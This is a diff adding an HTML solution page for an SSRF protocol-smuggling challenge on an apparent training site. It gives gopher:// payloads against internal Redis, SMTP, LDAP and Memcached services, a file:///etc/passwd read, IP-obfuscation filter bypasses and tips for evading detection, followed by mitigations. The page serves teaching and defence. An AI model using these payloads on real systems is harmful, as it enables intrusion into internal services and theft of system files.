@@ -1,0 +1,197 @@
+{% extends 'base.html' %}
+
+{% block title %}SSRF Level 22 Solution - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-10 offset-md-1">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">SSRF Level 22 Solution: SSRF via Protocol Smuggling</h2>
+            </div>
+            <div class="card-body">
+                <h3>Solution</h3>
+                <p>This challenge demonstrates advanced protocol smuggling techniques for bypassing SSRF protections, using multiple protocol layers and encoding methods to evade detection and access restricted services.</p>
+
+                <h4>Step-by-Step Solution:</h4>
+                <ol>
+                    <li><strong>Understand protocol smuggling:</strong> Wrapping one protocol inside another</li>
+                    <li><strong>Identify filter weaknesses:</strong> Bypass mechanisms and encoding issues</li>
+                    <li><strong>Craft smuggled requests:</strong> Embed HTTP requests in Gopher protocol</li>
+                    <li><strong>Chain multiple bypasses:</strong> Combine encoding and protocol techniques</li>
+                </ol>
+
+                <h4>Protocol Smuggling Payloads:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># Basic Gopher HTTP smuggling
+Smuggled Request: GET /admin HTTP/1.1\r\nHost: internal.admin.local\r\n\r\n
+Wrapper Protocol: gopher://127.0.0.1:80/
+
+# Advanced HTTP request smuggling
+Smuggled Request: POST /api/admin HTTP/1.1\r\nHost: internal.api.local\r\nContent-Length: 0\r\n\r\n
+Wrapper Protocol: gopher://localhost:8080/
+
+# Multi-protocol smuggling
+Smuggled Request: CONNECT internal.admin.local:443 HTTP/1.1\r\n\r\n
+Wrapper Protocol: gopher://proxy.internal:8080/
+
+# File protocol smuggling
+Smuggled Request: file:///etc/passwd
+Wrapper Protocol: gopher://127.0.0.1:80/_GET%20</code></pre>
+                    </div>
+                </div>
+
+                <h4>Advanced Encoding Techniques:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># URL encoding bypass
+Original: gopher://127.0.0.1:80/_GET /admin HTTP/1.1
+Encoded: gopher://127.0.0.1:80/_GET%20/admin%20HTTP/1.1
+
+# Double URL encoding
+Original: gopher://localhost:80/_GET /admin
+Double:   gopher://localhost:80/_%47%45%54%20/admin
+
+# Unicode encoding bypass
+Original: localhost
+Unicode:  l%u006fcalhost
+
+# Hex encoding
+Original: 127.0.0.1
+Hex:      0x7f000001
+
+# Octal encoding
+Original: 127.0.0.1
+Octal:    0177.0.0.1</code></pre>
+                    </div>
+                </div>
+
+                <h4>Protocol Smuggling Techniques:</h4>
+                <ul>
+                    <li><strong>Gopher HTTP smuggling:</strong> Embed HTTP requests in Gopher protocol</li>
+                    <li><strong>FTP bounce smuggling:</strong> Use FTP PORT command for port scanning</li>
+                    <li><strong>SMTP smuggling:</strong> Embed SMTP commands via Gopher</li>
+                    <li><strong>DNS smuggling:</strong> Use DNS queries for data exfiltration</li>
+                </ul>
+
+                <h4>Filter Bypass Methods:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># IP address obfuscation
+127.0.0.1 → 2130706433 (decimal)
+127.0.0.1 → 0x7f000001 (hex)
+127.0.0.1 → 0177.0.0.1 (octal)
+127.0.0.1 → 127.1 (short form)
+
+# Domain name tricks
+localhost → 127.0.0.1
+0.0.0.0 → 0
+[::1] → IPv6 localhost
+localtest.me → resolves to 127.0.0.1
+
+# Protocol case manipulation
+HTTP → http, Http, hTTp
+GOPHER → gopher, Gopher, GOPHER
+
+# Path traversal in URLs
+http://example.com/../../../admin
+http://example.com/./admin
+http://example.com/admin/./../../sensitive</code></pre>
+                    </div>
+                </div>
+
+                <h4>Advanced Smuggling Scenarios:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># Redis protocol smuggling
+gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a
+
+# MySQL protocol smuggling (limited)
+gopher://127.0.0.1:3306/_\x00\x00\x00\x01\x00\x00\x00\x00
+
+# SMTP command injection
+gopher://127.0.0.1:25/_EHLO%20attacker.com%0d%0aVRFY%20admin%0d%0a
+
+# LDAP protocol smuggling
+gopher://127.0.0.1:389/_\x30\x0c\x02\x01\x01\x60\x07\x02\x01\x03\x04\x00\x80\x00
+
+# Memcached protocol smuggling
+gopher://127.0.0.1:11211/_stats%0d%0a</code></pre>
+                    </div>
+                </div>
+
+                <h4>Chained Bypass Techniques:</h4>
+                <ul>
+                    <li><strong>Multiple encoding layers:</strong> URL + Unicode + Hex encoding</li>
+                    <li><strong>Protocol chaining:</strong> HTTP → Gopher → Redis</li>
+                    <li><strong>Domain fronting:</strong> Use CDN to hide real destination</li>
+                    <li><strong>DNS rebinding:</strong> Change DNS resolution mid-request</li>
+                </ul>
+
+                <h4>Tools Required:</h4>
+                <ul>
+                    <li><strong>Protocol smuggling tools:</strong> Custom Gopher URL generators</li>
+                    <li><strong>Encoding utilities:</strong> URL encoders, Unicode converters</li>
+                    <li><strong>Burp Suite extensions:</strong> Protocol manipulation plugins</li>
+                    <li><strong>Custom scripts:</strong> Multi-layer encoding automation</li>
+                </ul>
+
+                <h4>Impact:</h4>
+                <ul>
+                    <li>Complete bypass of SSRF protection mechanisms</li>
+                    <li>Access to heavily filtered internal services</li>
+                    <li>Advanced persistent access through protocol tunneling</li>
+                    <li>Evasion of network monitoring and detection</li>
+                </ul>
+
+                <h4>Real-World Examples:</h4>
+                <ul>
+                    <li><strong>Orange Tsai's research:</strong> Advanced Gopher protocol exploitation</li>
+                    <li><strong>BlackHat presentations:</strong> Protocol smuggling in cloud environments</li>
+                    <li><strong>Bug bounty reports:</strong> Major platform SSRF bypasses</li>
+                    <li><strong>CTF challenges:</strong> Advanced protocol manipulation techniques</li>
+                </ul>
+
+                <h4>Detection Evasion:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># Timing-based evasion
+# Add delays between requests to avoid rate limiting
+time.sleep(random.uniform(1, 5))
+
+# Request fragmentation
+# Split requests across multiple smaller requests
+
+# Protocol mixing
+# Use different protocols for different parts of attack
+
+# Encoding rotation
+# Rotate between different encoding methods</code></pre>
+                    </div>
+                </div>
+
+                <h4>Mitigation:</h4>
+                <ul>
+                    <li>Block dangerous protocols (gopher, file, ftp) completely</li>
+                    <li>Implement strict URL parsing and validation</li>
+                    <li>Use allowlists instead of blocklists</li>
+                    <li>Normalize and decode URLs before validation</li>
+                    <li>Implement deep packet inspection for protocol analysis</li>
+                    <li>Monitor for unusual protocol usage patterns</li>
+                </ul>
+
+                <div class="alert alert-danger">
+                    <h5><i class="bi bi-exclamation-triangle-fill me-2"></i>Master-Level Technique</h5>
+                    <p class="mb-0">Protocol smuggling represents the most advanced SSRF exploitation technique, capable of bypassing even sophisticated protection mechanisms. This requires deep protocol knowledge and creative thinking.</p>
+                </div>
+
+                <div class="text-center mt-4">
+                    <a href="/ssrf/level22" class="btn btn-primary me-2">Try Challenge Again</a>
+                    <a href="/ssrf/level23" class="btn btn-success">Next Challenge</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
